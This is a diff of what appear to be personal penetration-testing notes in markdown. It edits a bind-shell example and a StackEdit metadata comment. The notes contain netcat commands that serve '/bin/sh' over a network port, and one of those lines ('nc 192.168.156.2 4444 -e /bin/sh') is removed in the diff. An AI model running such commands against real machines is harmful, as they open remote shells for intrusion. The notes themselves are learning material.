@@ -138,8 +138,8 @@ In bind shell, the target sets up a listener on a specific port and the attacker
 nc -lvp 4444 -e /bin/sh
 ```
 ```
-# Victim's machine
-nc 192.168.156.2 4444 -e /bin/sh
+# Attacker's machine
+nc 192.168.156.2 4444
 ```
 ## Gaining Access
 ## Maintaining Access
@@ -148,11 +148,11 @@ nc 192.168.156.2 4444 -e /bin/sh
 Read:
 Darknet diaries
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyNDAwNjE1OTcsMTgxODE3NjIxOSwtMT
-A5Nzg5MTgxMywyMDU0MTcwODU0LDE1MzQ2OTIyNTQsLTM2MzE2
-MjAwOSw0OTI4OTEzNTQsLTE0OTgyMzEwMSwxODY1NjIyODEwLC
-0yMDgxNDYzMjE0LC0xMDE4MzYyNjcsLTQ3NDk5MDk4OCwtMTQ3
-MzExNTM2LC0xMjQ0MTk3Mjk4LDc2Mjc4MjE2MiwtMTgzMTMzOT
-g5LDQ2MjAyNjY3NSwtMTE3Njk1NzY5MywtMTAwNzUxMjIwOCwt
-NTMzNzI2ODUxXX0=
+eyJoaXN0b3J5IjpbMTY3NzQ1MjE3MCwxODE4MTc2MjE5LC0xMD
+k3ODkxODEzLDIwNTQxNzA4NTQsMTUzNDY5MjI1NCwtMzYzMTYy
+MDA5LDQ5Mjg5MTM1NCwtMTQ5ODIzMTAxLDE4NjU2MjI4MTAsLT
+IwODE0NjMyMTQsLTEwMTgzNjI2NywtNDc0OTkwOTg4LC0xNDcz
+MTE1MzYsLTEyNDQxOTcyOTgsNzYyNzgyMTYyLC0xODMxMzM5OD
+ksNDYyMDI2Njc1LC0xMTc2OTU3NjkzLC0xMDA3NTEyMjA4LC01
+MzM3MjY4NTFdfQ==
 -->
